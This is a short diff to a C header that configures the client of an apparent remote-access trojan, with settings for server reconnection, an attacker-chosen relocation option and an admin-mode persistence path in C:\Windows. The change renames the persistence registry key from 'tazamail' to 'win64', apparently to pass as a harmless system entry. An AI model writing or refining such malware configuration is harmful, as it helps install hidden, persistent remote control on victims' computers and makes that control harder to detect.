@@ -11,6 +11,7 @@
 #define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
 #define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
+#define NAME_KEY_REGISTER  "win64" 
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
@@ -23,7 +24,6 @@
 #define TIMEOUT_SOCK 5 // DO NOT TOUCH 
 #define SLEEP_RECV 200 // DO NOT TOUCH 
 #define TIMEOUT_POPEN 7 // DO NOT TOUCH
-#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
 #define SPLIT "|SPLIT|" 
 
 #endif
